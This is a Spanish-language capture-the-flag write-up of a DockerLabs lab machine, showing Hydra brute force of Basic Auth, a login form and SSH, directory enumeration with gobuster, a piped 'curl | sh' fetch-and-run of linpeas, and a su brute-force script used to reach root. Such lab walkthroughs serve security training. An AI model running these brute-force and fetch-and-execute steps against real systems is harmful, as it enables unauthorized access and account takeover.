---
Estado: Completado
Plataforma: DockerLabs
SO: Linux
Dificultad: Facil+
VectorInicial: Basic Auth Default Credentials → Login Bruteforce → SSH
Privesc: Password reuse + su brute force
Fecha: 2026-02-26
---
<img width="917" height="574" alt="Pasted image 20260226125648" src="https://github.com/user-attachments/assets/3355593f-be13-4f64-b174-e8389a961e5f" />

Comenzaremos por realizar un escaneo a la maquina para ver los vectores de entrada.

```bash
 settarget 172.17.0.2                                              
TARGET establecido: 172.17.0.2

 gomap -s $TARGET

  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
 ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
 ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
 ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
 ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝

🎯 Scanning 172.17.0.2 (997 ports)

PORT    STATE  SERVICE         VERSION
22      open   ssh             SSH-2.0 - OpenSSH 9.2p1 Debian-2+deb12u6
80      open   http            Apache 2.4.62 (Debian)

Host Exposure Summary
- 172.17.0.2 | open ports: 2 | critical: ssh | exposure: medium

✓ Completed scan in 34ms | hosts: 1 | open ports: 2
```

Tenemos 2 puertos abiertos:
- 22 para conexión SSH que puede servirnos para un futuro.
- 80 para conexión HTTP donde estará alojada una web.

Empezaremos visitando la web para ver que tenemos.

Nos encontramos con una solicitud de usuario y contraseña, lo que nos indica que estamos ante un Basic Authentification.

Llegado a este punto tenemos varias opciones, la primera buscar un exploit que nos permita agilizar el trabajo: [Basic Auth](https://github.com/NexusFireMan/Exploits/tree/main/Basic-Auth-Lab)

```bash
 python3 basic_auth_tester.py http://$TARGET -w /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt

[+] Basic Auth lab tester
[+] Target: http://172.17.0.2/
[+] Credentials file: /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
[+] Attempts: 66
[+] Progress: 44/66 (66%)

[!] Valid credential found
[!] user:pass = httpadmin:fhttpadmin
[!] HTTP status: 200
```

Gracias a este este script ya tenemos los credenciales iniciales.

Pero también podemos usar **Hydra** para descubrir el usuario.

```bash
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt http-get://$TARGET
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-26 15:22:36
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://172.17.0.2:80/
[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-26 15:22:38
```

En cualquiera de los 2 casos ya tenemos las credenciales para ver que hay dentro del servidor.

Y nos encontramos con la pagina por defecto de Apache y nada mas, nos toca realizar una enumeración de archivos y directorios.

```bash
 gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt,bak -U httpadmin -P fhttpadmin
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Auth User:               httpadmin
[+] Extensions:              html,php,txt,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 10701]
login.php            (Status: 200) [Size: 2798]
server-status        (Status: 403) [Size: 275]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================
```

Como este servidor tiene Basi Auth necesitamos indicar a Gobuster el usuario y la contraseña con los parámetros **-U** y **-P** respectivamente.

Observamos que hay un fichero llamado *login.php* así que vamos a ver que nos encontramos en el.

<img width="442" height="715" alt="Pasted image 20260226154316" src="https://github.com/user-attachments/assets/6d8483db-4c21-4154-a58b-bc15065f72d5" />

Nos encontramos con este panel de inicio de sesión bastante curioso.

Ahora es el paso de entrar en *Burp Suit* para capturar las peticiones y ver como podemos continuar.

Lo primero sera fijar el Tarjet para que solo capture las peticiones de este servidor.

<img width="908" height="623" alt="Pasted image 20260226160725" src="https://github.com/user-attachments/assets/f6457bfc-6e65-42e4-a96b-f22583b25042" />

Ahora capturamos las peticiones de la pagina para ver como solicita el ingreso, las cabeceras y lo que ocurre si ingresamos un usuario erróneo.

<img width="1439" height="944" alt="Pasted image 20260226160826" src="https://github.com/user-attachments/assets/9e333564-2f72-47f7-a0fe-5e9b21a644ba" />

Como podemos ver la petición se hace con el método **POST**, en la cabecera se añade **Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=**, los datos de inicio de sesión se pasan de manera muy clara **username=admin&password=admin** y al no ser correctos los datos nos indica el texto **Credenciales incorrectas.**.

Una vez recopilados estos datos podemos intentar un descubrimiento de credenciales mediante diccionario.

Como la lista de *rockyou.txt* es extremadamente grande la reduje a 300 a ver si iba mas rápido.

```bash
head -n 300 rockyou.txt > 300-rockyou.txt
```

Ahora le lanzamos el ataque para encontrar las credenciales.

```bash
 hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/300-rockyou.txt 172.17.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:H=Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=:F=Credenciales incorrectas." 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-26 16:25:16
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 5100 login tries (l:17/p:300), ~319 tries per task
[DATA] attacking http-post-form://172.17.0.2:80/login.php:username=^USER^&password=^PASS^:H=Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=:F=Credenciales incorrectas.
[80][http-post-form] host: 172.17.0.2   login: admin   password: chocolate
[STATUS] 4847.00 tries/min, 4847 tries in 00:01h, 253 to do in 00:01h, 16 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-26 16:26:29
```

Bien, con estos credenciales vamos a por el siguiente paso.

<img width="351" height="115" alt="Pasted image 20260226162857" src="https://github.com/user-attachments/assets/4eda3f2d-8250-41f0-b3fe-33f222e528a1" />

Después de iniciar sesión vemos este mensaje del usuario **balutin** y dicho esto, vamos por el *SSH* a ver si tenemos suerte.

```bash
 hydra -l balutin -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-26 16:31:09
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: balutin   password: estrella
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 3 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-26 16:32:14
```

Bien ahora que ya tenemos acceso por *ssh* a ver que nos encontramos en el servidor.

```bash
balutin@4cf1f32d9e59:~$ sudo -l                                                                                                                            
-bash: sudo: command not found

balutin@4cf1f32d9e59:~$ find / -perm -4000 2>/dev/null                                                                                                     
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
```

Por desgracia no tenemos una escalada de privilegios a simple vista, tendremos que buscar otros métodos, san google es tu amigo o chatgpt, todo depende del gusto.

También recordé la herramienta de [*linpeas*](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Pero este servidor no tiene *curl* y tampoco lo podemos instalar, así que tendremos que descargarlo en nuestra maquina y después subirlo.

```bash
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh

 chmod +x linpeas.sh 

 scp linpeas.sh balutin@$TARGET:/tmp/
```

Ahora volvemos a conectar con la maquina y vemos que información nos arroja *linpeas*.

```bash
<skip>

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/www/html/database.db

 -> Extracting tables from /var/www/html/database.db (limit 20)
  --> Found interesting column names in usuarios (output limit 10)
CREATE TABLE usuarios (username TEXT, password TEXT);
admin|chocolate

<skip>
```

Bueno parece que *linpeas* si ha encontrado algo, así que vamos a probarlo.

```bash
balutin@4cf1f32d9e59:/tmp$ su admin                                                                                                                        
su: user admin does not exist or the user entry does not contain all the required fields
balutin@4cf1f32d9e59:/tmp$ su root                                                                                                                         
Password: 
su: Authentication failure
balutin@4cf1f32d9e59:/tmp$  
```

Pero nada, toca seguir buscando a ver si encontramos algo.

Encontré un script que es posible que nos sirva de algo [suBruteForce.sh](https://github.com/D1se0/suBruteforce/blob/main/suBruteforceBash/suBruteforce.sh)

Así que volvemos a lo de antes, descargar y subir.

``` bash
 curl -L https://raw.githubusercontent.com/D1se0/suBruteforce/refs/heads/main/suBruteforceBash/suBruteforce.sh > suBruteforce.sh

 chmod +x suBruteforce.sh

 scp suBruteforce.sh balutin@$TARGET:/tmp/

 scp /usr/share/wordlists/rockyou.txt balutin@$TARGET:/tmp/
```

También tenemos que subir un diccionario para las contraseñas, así que hemos subido *rockyou.txt*.

```bash
 ssh balutin@$TARGET                                                                                                            
balutin@172.17.0.2's password: 
Linux 4cf1f32d9e59 6.18.9+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.9-1kali1 (2026-02-10) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Feb 26 16:01:47 2026 from 172.17.0.1
balutin@4cf1f32d9e59:~$ cd /tmp/
balutin@4cf1f32d9e59:/tmp$ ./suBruteforce.sh root rockyou.txt                                                                                              

***************************
*       suBruteforce      *
*        d1se0 v1.0       *
***************************

[-] Probando root:123456
Password: [-] Probando root:12345
Password: [-] Probando root:123456789
Password: [-] Probando root:password
Password: [-] Probando root:iloveyou
Password: [-] Probando root:princess
Password: [-] Probando root:1234567
Password: [-] Probando root:rockyou
Password: 'xterm-kitty': unknown terminal type.
[+] Contraseña encontrada para el usuario root:rockyou
balutin@4cf1f32d9e59:/tmp$ su root                                                                                                                         
Password: 
root@4cf1f32d9e59:/tmp# ls /root/
root@4cf1f32d9e59:/tmp# whoami
root
root@4cf1f32d9e59:/tmp# 
```

Con esto ya hemos comprometido el laboratorio y lo hemos finalizado.

La verdad que has esta un poco liado el tema de acceder como root pero ha sido interesante el poder usar varias técnicas hasta conseguirlo.
